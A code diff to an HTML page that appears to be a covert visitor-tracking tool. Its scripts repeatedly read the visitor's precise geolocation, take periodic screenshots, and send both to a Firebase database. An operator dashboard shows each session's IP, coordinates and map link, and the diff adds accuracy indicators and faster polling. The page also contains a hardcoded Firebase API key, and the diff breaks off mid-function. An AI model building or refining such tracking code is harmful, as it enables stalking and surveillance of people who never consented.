@@ -139,6 +139,22 @@
             border-radius: 4px;
             cursor: pointer;
         }
+        .accuracy-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        .high-accuracy {
+            background: #2ecc71;
+        }
+        .medium-accuracy {
+            background: #f39c12;
+        }
+        .low-accuracy {
+            background: #e74c3c;
+        }
     </style>
 </head>
 <body>
@@ -212,7 +228,7 @@
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
     <script>
         // ========================
-        // 🔥 FIREBASE CONFIGURATION
+        // 🔥 YOUR FIREBASE CONFIG
         // ========================
         const firebaseConfig = {
             apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
@@ -255,38 +271,30 @@
                 // First try: High accuracy with short timeout
                 const highAccuracyOptions = {
                     enableHighAccuracy: true,
-                    maximumAge: 0,
-                    timeout: 5000
+                    maximumAge: 0,  // Force fresh reading
+                    timeout: 5000  // 5 second timeout
                 };
 
-                // Second try: Lower accuracy if first fails
-                const lowAccuracyOptions = {
-                    enableHighAccuracy: false,
-                    maximumAge: 30000,
-                    timeout: 3000
-                };
-
-                const attemptLocation = (options, isRetry = false) => {
+                const attemptLocation = (options) => {
                     navigator.geolocation.getCurrentPosition(
                         position => {
                             const { latitude, longitude, accuracy } = position.coords;
+                            const accuracyClass = accuracy < 50 ? 'high-accuracy' : 
+                                               accuracy < 200 ? 'medium-accuracy' : 'low-accuracy';
                             resolve({
                                 coords: { lat: latitude, lng: longitude },
-                                accuracy: accuracy + ' meters',
+                                accuracy: accuracy,
+                                accuracyClass: accuracyClass,
                                 mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
                                 status: "active",
-                                method: isRetry ? "standard" : "high-accuracy"
+                                method: "high-accuracy"
                             });
                         },
                         error => {
-                            if (!isRetry) {
-                                attemptLocation(lowAccuracyOptions, true);
-                            } else {
-                                resolve({
-                                    status: "error",
-                                    error: error.message || "Location unavailable"
-                                });
-                            }
+                            resolve({
+                                status: "error",
+                                error: error.message || "Location unavailable"
+                            });
                         },
                         options
                     );
@@ -305,7 +313,7 @@
 
         // 2. Track Location with Fallbacks
         async function trackLocation() {
-            // Immediately set status to "acquiring"
+            // Immediately set status to show we're trying
             db.ref(`sessions/${sessionId}/location`).set({
                 status: "acquiring",
                 timestamp: new Date().toISOString()
@@ -366,7 +374,7 @@
         });
         
         // Ongoing tracking
-        setInterval(trackLocation, 15000);
+        setInterval(trackLocation, 10000); // Update every 10 seconds
         setTimeout(captureScreenshot, 5000);
         setInterval(captureScreenshot, 30000);
 
@@ -404,10 +412,12 @@
                     
                     let locationStatus = "❌ Blocked";
                     let mapsLink = "#";
+                    let accuracyIndicator = "";
                     
                     if (location && location.status === "active") {
                         locationStatus = `✅ ${location.coords.lat}, ${location.coords.lng}`;
                         mapsLink = location.mapsLink;
+                        accuracyIndicator = `<span class="accuracy-indicator ${location.accuracyClass || 'medium-accuracy'}"></span>`;
                     } else if (location && location.error) {
                         locationStatus = `⚠️ ${location.error}`;
                     }
@@ -417,7 +427,7 @@
                             <h3>🔎 ${sessionId}</h3>
                             <p><strong>📅 Started:</strong> ${new Date(sessionData.startTime).toLocaleString()}</p>
                             <p><strong>🌐 IP:</strong> ${ip}</p>
-                            <p><strong>📍 Location:</strong> ${locationStatus}</p>
+                            <p><strong>📍 Location:</strong> ${accuracyIndicator}${locationStatus}</p>
                             
                             ${mapsLink !== "#" ? `
                                 <p>
@@ -476,15 +486,4 @@ ${JSON.stringify(data, null, 2)}
                             </pre>
                             <button onclick="window.close()" style="padding: 10px 20px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                 Close
-                            </button>
-                        </body>
-                    </html>
-                `);
-            });
-        }
-
-        function exportAllData() {
-            db.ref('sessions').once('value').then(snapshot => {
-                const data = snapshot.val();
-                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-                const url = URL.createObjectURL(b
+                    
